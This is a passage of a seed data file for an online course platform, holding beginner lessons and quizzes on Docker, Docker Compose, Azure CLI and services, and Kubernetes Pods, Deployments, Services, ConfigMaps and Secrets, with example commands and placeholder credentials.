      `\`\`\`bash\ndocker --version\ndocker run hello-world\n\`\`\`\n\n\`docker run\` downloads the \`hello-world\` image from **Docker Hub** (a public registry of images) if you don't already have it, then starts a container from it.\n\n## Essential commands\n\n\`\`\`bash\ndocker pull nginx              # download an image without running it\ndocker images                  # list images you have locally\ndocker run -d -p 8080:80 nginx # run nginx in the background, map port 8080 -> 80\ndocker ps                      # list running containers\ndocker ps -a                   # list all containers, including stopped ones\ndocker stop <container_id>     # stop a running container\ndocker rm <container_id>       # remove a stopped container\n\`\`\`\n\n\`-p 8080:80\` maps port 8080 on your machine to port 80 inside the container, that's how you reach a containerized web server from your browser.\n\n> [!TIP]\n> \`docker ps\` only shows running containers, add \`-a\` to see stopped ones too, a common source of confusion for beginners.`
    ),
    quiz: {
      title: 'First Container Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which command lists currently running containers?',
          options: ['docker images', 'docker ps', 'docker pull', 'docker list'],
          answer: 'docker ps',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The flag -p 8080:____ maps port 8080 on your machine to port 80 inside the container.',
          options: [],
          answer: '80',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'docker ps shows stopped containers by default, without needing any extra flags.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Writing a Dockerfile',
    content: lessonContent(
      'Writing a Dockerfile',
      `A **Dockerfile** is a script that describes how to build your own image, step by step.\n\n\`\`\`\nFROM node:20-alpine\n\nWORKDIR /app\n\nCOPY package*.json ./\nRUN npm install\n\nCOPY . .\n\nEXPOSE 3000\nCMD ["node", "server.js"]\n\`\`\`\n\n## Reading it line by line\n\n- \`FROM\` picks a base image to start from, here a lightweight Node.js image.\n- \`WORKDIR\` sets the working directory inside the container for every instruction after it.\n- \`COPY\` copies files from your machine into the image.\n- \`RUN\` executes a command **while building** the image (installing dependencies, here).\n- \`EXPOSE\` documents which port the container listens on.\n- \`CMD\` is the command that runs **when a container starts** from this image.\n\n## Building and running your image\n\n\`\`\`bash\ndocker build -t my-app .\ndocker run -p 3000:3000 my-app\n\`\`\`\n\n\`-t my-app\` tags the image with a name so you can refer to it later instead of a random id.\n\n> [!WARNING]\n> Copying \`package*.json\` and running \`npm install\` **before** copying the rest of your code lets Docker reuse that cached layer when only your source changes, skipping a slow reinstall on every build.`
    ),
    quiz: {
      title: 'Dockerfile Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which Dockerfile instruction runs a command while the image is being built (like installing dependencies)?',
          options: ['CMD', 'RUN', 'EXPOSE', 'FROM'],
          answer: 'RUN',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The docker ____ -t my-app . command builds an image from a Dockerfile and tags it "my-app".',
          options: [],
          answer: 'build',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'CMD specifies the command that runs when a container starts, not while the image is built.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Volumes and Environment Variables',
    content: lessonContent(
      'Volumes and Environment Variables',
      `Containers are meant to be disposable, when one is removed, anything written to its filesystem is gone too. **Volumes** and **environment variables** are how you deal with data and configuration that need to survive or vary between environments.\n\n## Volumes: persisting data\n\n\`\`\`bash\ndocker run -d -p 27017:27017 -v mongo_data:/data/db mongo\n\`\`\`\n\n\`-v mongo_data:/data/db\` mounts a named volume called \`mongo_data\` at \`/data/db\` inside the container. MongoDB's actual data lives in that volume, on the host machine, so it survives even if the container is removed and recreated.\n\n## Environment variables: configuration\n\n\`\`\`bash\ndocker run -e DATABASE_URL="postgresql://user:pass@db:5432/app" -p 3000:3000 my-app\n\`\`\`\n\n\`-e\` passes an environment variable into the container, exactly like setting one in your shell, letting the same image behave differently across dev, staging, and production without being rebuilt.\n\n> [!TIP]\n> Never bake secrets (passwords, API keys) directly into an image with \`COPY\` or \`RUN\`, pass them in at runtime with \`-e\` or an env file instead.`
    ),
    quiz: {
      title: 'Volumes & Env Vars Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Why use a volume instead of writing data directly into a container?',
          options: [
            'Volumes make containers start faster',
            'Data in a volume survives even if the container is removed',
            'Volumes are required for every container',
            'Volumes disable networking',
          ],
          answer: 'Data in a volume survives even if the container is removed',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The ____ flag passes an environment variable into a running container.',
          options: [],
          answer: '-e',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Secrets like passwords should be baked directly into a Docker image with COPY.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Docker Compose: Multi-Container Apps',
    content: lessonContent(
      'Docker Compose: Multi-Container Apps',
      `Real applications are rarely a single container, you usually need an app server, a database, maybe a cache. **Docker Compose** describes a whole multi-container setup in one file.\n\n\`\`\`\nservices:\n  web:\n    build: .\n    ports:\n      - "3000:3000"\n    environment:\n      DATABASE_URL: postgresql://user:pass@db:5432/app\n    depends_on:\n      - db\n\n  db:\n    image: postgres:16\n    environment:\n      POSTGRES_PASSWORD: pass\n    volumes:\n      - db_data:/var/lib/postgresql/data\n\nvolumes:\n  db_data:\n\`\`\`\n\n## Running it\n\n\`\`\`bash\ndocker compose up -d\ndocker compose down\n\`\`\`\n\n\`docker compose up\` builds (if needed) and starts every service defined in the file. Notice \`web\` reaches the database at the hostname \`db\`, Compose automatically creates a shared network where each service can find the others **by service name**.\n\n\`depends_on\` controls startup order, but doesn't wait for the database to be fully ready to accept connections, that's a common real-world gotcha worth knowing about early.`
    ),
    quiz: {
      title: 'Compose Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'In Docker Compose, how does one service reach another (e.g. web reaching db)?',
          options: [
            'By IP address only',
            'By the service name, as a hostname',
            'They cannot communicate',
            'By port forwarding to localhost',
          ],
          answer: 'By the service name, as a hostname',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'docker compose ____ builds and starts every service defined in the compose file.',
          options: [],
          answer: 'up',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "depends_on guarantees a service won't start until the service it depends on is fully ready to accept connections.",
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Final Project: Containerize a Web App',
    content: lessonContent(
      'Final Project: Containerize a Web App',
      `Time to package a real application with Docker.\n\n## Requirements\n\n1. Write a \`Dockerfile\` for an existing app of yours (or a simple new one), ordering instructions so dependency installation is cached separately from your source code.\n2. Build the image and run it as a container, confirm it works by accessing it from your browser or a REST client.\n3. Add a second service the app depends on (a database, cache, etc.) using a \`docker-compose.yml\` file.\n4. Use a named volume so that service's data survives \`docker compose down\` and \`docker compose up\` again.\n5. Pass at least one piece of configuration in via an environment variable rather than hardcoding it.\n\n## Stretch goals\n\n- Add a \`.dockerignore\` file to keep \`node_modules\`/\`.git\`/etc. out of your image.\n- Use a multi-stage build to keep the final image small.\n- Push your image to Docker Hub.\n\nSubmit your repository link below when you are done, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const azureLessons: SeedLesson[] = [
  {
    title: 'Introduction to Cloud Computing and Azure',
    content: lessonContent(
      'Introduction to Cloud Computing and Azure',
      `**Cloud computing** means renting computing power, storage, and services from a provider instead of buying and maintaining your own servers. **Microsoft Azure** is one of the largest cloud providers, alongside AWS and Google Cloud.\n\n## The service models\n\n| Model | You manage | Provider manages | Example |\n|---|---|---|---|\n| IaaS | OS, runtime, app | Physical hardware, networking | Azure Virtual Machines |\n| PaaS | Just your app and data | OS, runtime, scaling | Azure App Service |\n| SaaS | Just your data | Everything else | Microsoft 365 |\n\nMost of this course focuses on **PaaS**, services like App Service let you deploy code directly without managing servers at all.\n\n## Azure's building blocks\n\n- **Regions**, physical data center locations around the world (e.g. "West Europe").\n- **Resource groups**, logical containers that hold related resources (a web app, its database, its storage) so you can manage and delete them together.\n- **Azure Portal**, the web dashboard for creating and managing everything visually, at [portal.azure.com](https://portal.azure.com).\n\n> [!NOTE]\n> Every Azure resource you create belongs to exactly one resource group, get comfortable with them early, they're the organizing unit for almost everything else in this course.`
    ),
    quiz: {
      title: 'Cloud Basics Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'In the PaaS model, which of these does the cloud provider manage for you?',
          options: ['Only physical hardware', 'The OS, runtime, and scaling', 'Nothing, you manage everything', 'Only your application code'],
          answer: 'The OS, runtime, and scaling',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A ____ is a logical container that groups related Azure resources together.',
          options: [],
          answer: 'resource group',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Every Azure resource belongs to exactly one resource group.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Resource Groups and the Azure CLI',
    content: lessonContent(
      'Resource Groups and the Azure CLI',
      `The **Azure CLI** (\`az\`) lets you create and manage resources from the command line, scriptable and repeatable, unlike clicking through the Portal.\n\n\`\`\`bash\naz login\n\naz group create --name kodstigen-rg --location westeurope\n\naz group list --output table\n\naz group delete --name kodstigen-rg\n\`\`\`\n\n## Reading the commands\n\n- \`az login\` opens a browser to authenticate the CLI with your Azure account.\n- \`az group create\` makes a new resource group in a chosen **region** (\`--location\`).\n- \`--output table\` formats results as a readable table instead of raw JSON, useful while exploring.\n- \`az group delete\` removes the resource group **and everything inside it**, a fast way to clean up when you're done experimenting.\n\n> [!WARNING]\n> Deleting a resource group deletes every resource inside it permanently. It's convenient for cleanup, but double-check the name before you run it.`
    ),
    quiz: {
      title: 'Azure CLI Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which command authenticates the Azure CLI with your account?',
          options: ['az auth', 'az login', 'az connect', 'az signin'],
          answer: 'az login',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'az group create uses the ____ flag to pick which region the resource group lives in.',
          options: [],
          answer: '--location',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Deleting a resource group only deletes the group itself, leaving the resources inside it untouched.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Deploying a Web App with Azure App Service',
    content: lessonContent(
      'Deploying a Web App with Azure App Service',
      `**Azure App Service** is a fully-managed PaaS for hosting web apps and APIs, you push your code, Azure handles the servers, scaling, and patching.\n\n\`\`\`bash\naz webapp up \\\n  --name kodstigen-demo-app \\\n  --resource-group kodstigen-rg \\\n  --runtime "NODE:20-lts"\n\`\`\`\n\n\`az webapp up\` is a convenience command, it creates an App Service plan and web app if they don't exist yet, then deploys your current folder's code to it in one step.\n\n## Key concepts\n\n- An **App Service Plan** defines the underlying compute (how much CPU/RAM, how many instances), think of it as the "size" of the box your app runs in.\n- A **Web App** is the actual application running on that plan, you can run multiple web apps on one plan.\n- Once deployed, your app is reachable at \`https://<app-name>.azurewebsites.net\`.\n\n\`\`\`bash\naz webapp log tail --name kodstigen-demo-app --resource-group kodstigen-rg\n\`\`\`\n\n\`log tail\` streams your app's live logs, the first thing to check when a deployment doesn't behave as expected.`
    ),
    quiz: {
      title: 'App Service Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does an App Service Plan define?',
          options: [
            'The domain name of your app',
            'The underlying compute size and capacity your app runs on',
            'The programming language only',
            'The database connection string',
          ],
          answer: 'The underlying compute size and capacity your app runs on',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A deployed web app is reachable at https://<app-name>.____.net by default.',
          options: [],
          answer: 'azurewebsites',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Multiple web apps can run on the same App Service Plan.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Storing Data with Azure Storage',
    content: lessonContent(
      'Storing Data with Azure Storage',
      `**Azure Storage** is a family of services for storing files, structured data, and messages at scale. The one you'll reach for most often is **Blob Storage**, built for unstructured files like images, videos, backups, and documents.\n\n## The hierarchy\n\n- A **storage account**, the top-level container for all your storage services.\n- **Containers**, similar to folders, group related blobs together.\n- **Blobs**, the actual files themselves.\n\n\`\`\`bash\naz storage account create --name kodstigenstorage --resource-group kodstigen-rg --sku Standard_LRS\n\naz storage container create --name uploads --account-name kodstigenstorage\n\naz storage blob upload --account-name kodstigenstorage --container-name uploads --name photo.jpg --file ./photo.jpg\n\`\`\`\n\n## When to use what\n\n| Service | Best for |\n|---|---|\n| Blob Storage | Files: images, videos, backups, static website assets |\n| Table Storage | Simple key-value / NoSQL data at massive scale |\n| Queue Storage | Passing messages between parts of an application |\n\n\`--sku Standard_LRS\` picks a pricing/redundancy tier, "Locally Redundant Storage", the cheapest option, keeping multiple copies within one data center.`
    ),
    quiz: {
      title: 'Storage Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which Azure Storage service is best suited for storing image and video files?',
          options: ['Table Storage', 'Queue Storage', 'Blob Storage', 'App Service'],
          answer: 'Blob Storage',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Inside a storage account, blobs are grouped into ____, similar to folders.',
          options: [],
          answer: 'containers',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A storage account is the top-level container that holds all of your storage services.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Azure Databases: Azure SQL and Cosmos DB',
    content: lessonContent(
      'Azure Databases: Azure SQL and Cosmos DB',
      `Rather than running your own database server on a VM, Azure offers fully-managed database services, Azure handles patching, backups, and failover for you.\n\n## Azure SQL Database\n\nA managed, relational SQL Server database, a good fit if your data has a stable, well-defined schema.\n\n\`\`\`bash\naz sql server create --name kodstigen-sql --resource-group kodstigen-rg --admin-user sqladmin --admin-password "P@ssword123!"\n\naz sql db create --name kodstigen-db --server kodstigen-sql --resource-group kodstigen-rg --service-objective S0\n\`\`\`\n\n## Azure Cosmos DB\n\nA globally distributed, multi-model NoSQL database, if the flexible, document-style data you worked with in MongoDB sounded appealing, Cosmos DB even offers an API that speaks MongoDB's wire protocol.\n\n\`\`\`bash\naz cosmosdb create --name kodstigen-cosmos --resource-group kodstigen-rg --kind GlobalDocumentDB\n\`\`\`\n\n## Which one?\n\n| | Azure SQL Database | Cosmos DB |\n|---|---|---|\n| Data shape | Rows and columns | Flexible documents |\n| Best for | Structured, relational data | High-scale, globally distributed apps |\n| Query language | T-SQL | SQL-like, or MongoDB/Cassandra/Gremlin APIs |\n\n> [!NOTE]\n> Both services are billed based on the capacity/tier you provision, always check the pricing tier before creating one, it's easy to leave an expensive tier running by accident.`
    ),
    quiz: {
      title: 'Azure Databases Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which managed Azure database is the best fit for structured, relational data queried with T-SQL?',
          options: ['Cosmos DB', 'Azure SQL Database', 'Blob Storage', 'Queue Storage'],
          answer: 'Azure SQL Database',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Azure ____ DB is a globally distributed, multi-model NoSQL database that can even speak the MongoDB wire protocol.',
          options: [],
          answer: 'Cosmos',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Using a managed database service means Azure handles patching and backups for you.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Final Project: Deploy a Full App to Azure',
    content: lessonContent(
      'Final Project: Deploy a Full App to Azure',
      `Time to put a real application live on Azure.\n\n## Requirements\n\n1. Create a resource group for the project using the Azure CLI.\n2. Deploy a web app (frontend, API, or full-stack) to Azure App Service using \`az webapp up\` or your CI/CD tool of choice.\n3. Create a storage account and use Blob Storage for at least one piece of user-uploaded or generated content (an image, a file export, etc.).\n4. Confirm the deployed app is reachable at its \`azurewebsites.net\` URL and actually uses the storage account.\n5. Use \`az webapp log tail\` at least once to debug something during deployment.\n\n## Stretch goals\n\n- Add an Azure SQL Database or Cosmos DB instance and connect your app to it.\n- Set an environment variable/app setting on the Web App via the CLI instead of the Portal.\n- Clean up by deleting the resource group when you're done, and confirm everything inside it is gone.\n\nSubmit your repository link (or a link to your deployed app) below when you are done, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const kubernetesLessons: SeedLesson[] = [
  {
    title: 'Why Kubernetes? Pods and the Control Plane',
    content: lessonContent(
      'Why Kubernetes? Pods and the Control Plane',
      `Docker gets a single container running reliably. **Kubernetes** (often shortened to "k8s") is what takes over once you have many containers, across many machines, that need to be scheduled, restarted when they crash, scaled up and down, and discovered by each other automatically.\n\n## The problem Kubernetes solves\n\nRunning a handful of containers by hand with \`docker run\` works fine on one machine. It falls apart once you have:\n- Multiple machines (a **cluster**) to spread containers across.\n- Containers that need to be automatically restarted if they crash or a machine dies.\n- A need to scale a service from 2 replicas to 20 during a traffic spike.\n- Services that need to find and talk to each other without hardcoded IP addresses.\n\nKubernetes is a **container orchestrator**: you declare the desired state ("I want 3 replicas of this container running"), and Kubernetes continuously works to make reality match that declaration.\n\n## The control plane and nodes\n\nA cluster has two kinds of machines:\n\n| | Control plane | Worker nodes |\n|---|---|---|\n| Job | Decides *what* should run *where* | Actually runs the containers |\n| Key components | API server, scheduler, controller manager, etcd | kubelet, kube-proxy, container runtime |\n\n- The **API server** is the front door, every \`kubectl\` command and every internal component talks to Kubernetes through it.\n- **etcd** is the cluster's database, the single source of truth for the desired state.\n- The **scheduler** decides which node a new Pod should run on (based on available resources, constraints, etc).\n- The **kubelet** runs on every worker node and makes sure the containers the control plane assigned to that node are actually running.\n\n## Pods: the smallest deployable unit\n\nYou don't deploy a container directly in Kubernetes, you deploy a **Pod**, a wrapper around one or more containers that always run together on the same node and share networking/storage.\n\n\`\`\`yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name: hello-pod\nspec:\n  containers:\n    - name: hello\n      image: nginx:latest\n      ports:\n        - containerPort: 80\n\`\`\`\n\nMost Pods run exactly one container, the "multiple containers" case is for tightly-coupled helpers (like a logging sidecar) that genuinely need to share a network namespace and disk with the main container.\n\n> [!NOTE]\n> You'll rarely create a bare Pod directly in a real project, almost everything is managed through a **Deployment** (next lesson), which creates and manages Pods for you and handles restarts, scaling, and rollouts.`
    ),
    quiz: {
      title: 'Kubernetes Basics Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is a Pod in Kubernetes?',
          options: [
            'A single physical machine',
            'The smallest deployable unit, wrapping one or more containers',
            "A backup of the cluster's database",
            'A type of load balancer',
          ],
          answer: 'The smallest deployable unit, wrapping one or more containers',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "Which control plane component is the single source of truth for the cluster's desired state?",
          options: ['kubelet', 'etcd', 'kube-proxy', 'Docker'],
          answer: 'etcd',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Every kubectl command and internal component talks to the cluster through the API server.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: "The control plane component responsible for deciding which node a new Pod runs on is the ____.",
          options: [],
          answer: 'scheduler',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'In a real project, you should almost always create bare Pods directly instead of using a Deployment.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The component that runs on every worker node and ensures its assigned containers are actually running is the ____.',
          options: [],
          answer: 'kubelet',
        },
      ],
    },
  },
  {
    title: 'Deployments and ReplicaSets',
    content: lessonContent(
      'Deployments and ReplicaSets',
      `Bare Pods have no self-healing: if a Pod's node dies, that Pod is gone for good. A **Deployment** is the standard way to run and manage Pods in practice, it describes a desired state and Kubernetes continuously reconciles reality to match it.\n\n## Declaring a Deployment\n\n\`\`\`yaml\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      labels:\n        app: web\n    spec:\n      containers:\n        - name: web\n          image: myregistry/web:1.4.0\n          ports:\n            - containerPort: 8080\n\`\`\`\n\n- \`replicas: 3\` declares you always want 3 copies of this Pod running.\n- \`selector\`/\`template.metadata.labels\` must match, this is how the Deployment knows which Pods belong to it.\n- \`template\` is effectively a Pod spec, the Deployment stamps out Pods from this template.\n\n## ReplicaSets: the mechanism underneath\n\nA Deployment doesn't manage Pods directly, it manages a **ReplicaSet**, which is the thing that actually watches the Pod count and creates/deletes Pods to match \`replicas\`. You'll almost never create a ReplicaSet by hand, but understanding it explains what's happening when you list resources:\n\n\`\`\`bash\nkubectl get deployments\nkubectl get replicasets\nkubectl get pods\n\`\`\`\n\nEach layer exists for a reason: the Deployment adds **rollout history and rolling updates** on top of what a plain ReplicaSet can do.\n\n## Rolling updates\n\nChange the image tag and re-apply, and the Deployment performs a **rolling update** by default: it spins up new Pods with the new version, waits for them to become healthy, then terminates old Pods, a few at a time, so the service never has zero healthy replicas.\n\n\`\`\`bash\nkubectl set image deployment/web web=myregistry/web:1.5.0\nkubectl rollout status deployment/web\nkubectl rollout undo deployment/web   # roll back if something's wrong\n\`\`\`\n\n> [!TIP]\n> \`kubectl rollout undo\` is your emergency brake, it re-applies the previous ReplicaSet's Pod template immediately, no need to remember or re-type the old image tag.`
    ),
    quiz: {
      title: 'Deployments Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does a Deployment actually manage under the hood?',
          options: [
            'Pods directly, with no intermediate resource',
            'A ReplicaSet, which manages the Pods',
            'Nodes',
            'The API server',
          ],
          answer: 'A ReplicaSet, which manages the Pods',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The ____ field in a Deployment spec declares how many copies of the Pod should always be running.',
          options: [],
          answer: 'replicas',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'By default, a Deployment updates all Pods to a new image simultaneously, causing brief downtime.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which command rolls back a Deployment to its previous version?',
          options: ['kubectl rollout undo', 'kubectl delete deployment', 'kubectl get rollback', 'kubectl apply --previous'],
          answer: 'kubectl rollout undo',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "The selector and the Pod template's labels must match for a Deployment to know which Pods belong to it.",
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'kubectl rollout ____ deployment/web shows the live progress of an ongoing rollout.',
          options: [],
          answer: 'status',
        },
      ],
    },
  },
  {
    title: 'Services and Networking',
    content: lessonContent(
      'Services and Networking',
      `Pods are ephemeral, when one is replaced (a rollout, a crash, a rescheduled Pod), it gets a **brand new IP address**. Nothing that depends on a Pod's IP directly would survive that. A **Service** gives a stable network identity in front of a changing set of Pods.\n\n## Why you can't just use Pod IPs\n\n\`\`\`\nPod IP: 10.244.1.7  →  crashes, replaced  →  new Pod IP: 10.244.2.3\n\`\`\`\n\nAnything that hardcoded \`10.244.1.7\` breaks the moment that Pod is replaced. A Service solves this with a stable virtual IP and DNS name that automatically routes to whichever Pods currently match its selector.\n\n## Defining a Service\n\n\`\`\`yaml\napiVersion: v1\nkind: Service\nmetadata:\n  name: web\nspec:\n  selector:\n    app: web\n  ports:\n    - port: 80\n      targetPort: 8080\n\`\`\`\n\n\`selector: app: web\` means this Service load-balances traffic across every Pod carrying that label, exactly the same label used by the Deployment's template. Other Pods in the cluster can now reach this Service at the DNS name \`web\` (or \`web.<namespace>.svc.cluster.local\` in full).\n\n## Service types\n\n| Type | What it does |\n|---|---|\n| \`ClusterIP\` (default) | Only reachable from inside the cluster |\n| \`NodePort\` | Also exposes a fixed port on every node's IP |\n| \`LoadBalancer\` | Asks the cloud provider to provision an external load balancer |\n\nMost internal, service-to-service traffic uses \`ClusterIP\`, you only reach for \`LoadBalancer\` for something the outside world needs to hit directly, like a public-facing web frontend.\n\n## Labels and selectors tie it all together\n\nLabels are simple key-value pairs attached to any Kubernetes object, and selectors are how Deployments, Services, and other resources find the right Pods to act on:\n\n\`\`\`yaml\nlabels:\n  app: web\n  environment: production\n\`\`\`\n\n> [!WARNING]\n> A Service with a selector that doesn't match any Pod's labels silently "works" (it exists and has a DNS name), but routes traffic to nowhere, an extremely common, very confusing first Kubernetes bug. Always double check the label spelling matches exactly on both sides.`
    ),
    quiz: {
      title: 'Services & Networking Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "Why can't other parts of your app just rely on a Pod's IP address directly?",
          options: [
            'Pod IPs never change',
            "A Pod's IP changes every time it's replaced",
            "Pods don't have IP addresses",
            'IP addresses are deprecated in Kubernetes',
          ],
          answer: "A Pod's IP changes every time it's replaced",
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which Service type is only reachable from inside the cluster?',
          options: ['NodePort', 'LoadBalancer', 'ClusterIP', 'ExternalName'],
          answer: 'ClusterIP',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A Service routes traffic to Pods based on matching labels via a selector.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A Service with a selector that matches no Pods will exist but route traffic to ____.',
          options: [],
          answer: 'nowhere',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which Service type asks the cloud provider to provision an external load balancer?',
          options: ['ClusterIP', 'NodePort', 'LoadBalancer', 'Ingress'],
          answer: 'LoadBalancer',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Labels are a Kubernetes field that only Services can use.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'ConfigMaps, Secrets, and Volumes',
    content: lessonContent(
      'ConfigMaps, Secrets, and Volumes',
      `Hardcoding configuration (URLs, feature flags, credentials) directly into a container image means rebuilding the image every time a setting changes, and it means secrets end up baked into an image anyone with registry access can pull. Kubernetes externalizes this with **ConfigMaps**, **Secrets**, and **Volumes**.\n\n## ConfigMaps: non-sensitive configuration\n\n\`\`\`yaml\napiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: web-config\ndata:\n  LOG_LEVEL: 'info'\n  FEATURE_NEW_CHECKOUT: 'true'\n\`\`\`\n\n\`\`\`yaml\n# inside a Pod spec\ncontainers:\n  - name: web\n    image: myregistry/web:1.5.0\n    envFrom:\n      - configMapRef:\n          name: web-config\n\`\`\`\n\n\`envFrom\`/\`configMapRef\` injects every key in the ConfigMap as an environment variable, change the ConfigMap and restart the Pods, no image rebuild required.\n\n## Secrets: the same idea, for sensitive values\n\n\`\`\`yaml\napiVersion: v1\nkind: Secret\nmetadata:\n  name: db-credentials\ntype: Opaque\ndata:\n  password: cGFzc3dvcmQxMjM=   # base64-encoded, NOT encrypted\n\`\`\`\n\n> [!WARNING]\n> Secret values are **base64-encoded, not encrypted**, by default, anyone who can read the Secret object can trivially decode it. Real production clusters pair Secrets with encryption-at-rest and tools like a proper secrets manager (Vault, AWS Secrets Manager, sealed-secrets) rather than relying on the base64 encoding for actual protection.\n\n## Volumes: storage that outlives a container\n\nA container's own filesystem disappears the moment it restarts. A **Volume** attaches storage to a Pod that can persist across container restarts (or even be shared between containers in the same Pod).\n\n\`\`\`yaml\nspec:\n  containers:\n    - name: web\n      image: myregistry/web:1.5.0\n      volumeMounts:\n        - name: cache-data\n          mountPath: /var/cache/app\n  volumes:\n    - name: cache-data\n      emptyDir: {}\n\`\`\`\n\n\`emptyDir\` survives container restarts within the same Pod, but is deleted when the Pod itself is removed. For storage that must outlive the Pod entirely (a database's data directory), you'd use a **PersistentVolumeClaim** instead, which requests storage from the cluster that exists independently of any one Pod's lifecycle.`
    ),
    quiz: {
      title: 'Config & Storage Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is the main purpose of a ConfigMap?',
          options: [
            'Storing encrypted secrets',
            'Storing non-sensitive configuration outside the container image',
            'Scheduling Pods',
            'Load balancing traffic',
          ],
          answer: 'Storing non-sensitive configuration outside the container image',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "Kubernetes Secret values are encrypted by default, so anyone who can read the object can't see the real value.",
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Secret values are stored ____-encoded by default, which is not the same as encryption.',
          options: [],
          answer: 'base64',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "What happens to an emptyDir volume's contents when its Pod is deleted?",
          options: [
            'They persist forever',
            'They are deleted along with the Pod',
            'They are automatically backed up to S3',
            'Nothing, emptyDir cannot be deleted',
          ],
          answer: 'They are deleted along with the Pod',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "Changing a ConfigMap's values requires rebuilding the container image.",
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: "For storage that must outlive a Pod entirely, like a database's data directory, you'd use a Persistent Volume ____ instead of a plain volume.",
          options: [],
          answer: 'Claim',
        },
      ],
    },
  },
  {
    title: 'kubectl and Working with a Real Cluster',
    content: lessonContent(
      'kubectl and Working with a Real Cluster',
